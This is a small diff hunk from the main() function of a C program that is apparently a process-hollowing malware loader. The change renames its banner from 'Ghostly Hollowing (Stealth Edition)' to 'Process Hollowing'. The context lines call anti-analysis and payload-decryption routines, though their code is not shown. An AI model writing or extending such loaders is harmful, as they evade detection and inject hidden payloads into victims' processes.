@@ -993,7 +993,7 @@ int main()
 {
     AntiAnalysis();
 
-    printf("=== Ghostly Hollowing (Stealth Edition) ===\n");
+    printf("=== Process Hollowing ===\n");
     printf("[*] Encrypted payload size: %lu bytes\n", payload_size);
 
     DecryptPayload();
